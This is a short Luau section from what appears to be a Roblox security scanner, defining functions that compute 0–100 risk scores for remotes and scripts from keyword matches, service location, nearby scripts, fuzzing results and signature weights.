-- §15  RISK SCORING ENGINE
-- ═══════════════════════════════════════════════════════════════════════

local function calcRemoteRisk(entry)
    local score = 0
    if entry.keyword then score += 40 end
    if entry.svc == "ServerScriptService" then score += 15
    elseif entry.svc == "ServerStorage"   then score += 10 end
    local parent = entry.inst and entry.inst.Parent
    if parent then
        for _, c in ipairs(parent:GetChildren()) do
            if c:IsA("Script") or c:IsA("LocalScript") or c:IsA("ModuleScript") then
                score += 12; break
            end
        end
    end
    score += (entry.fuzzRisk or 0)
    return math.min(score, 100)
end

local function calcScriptRisk(flags, sigs)
    local score = 0
    for _, f in ipairs(flags) do score += (f.w or 5) end
    for _, sig in ipairs(sigs)  do score += sig.risk  end
    return math.min(score, 100)
end

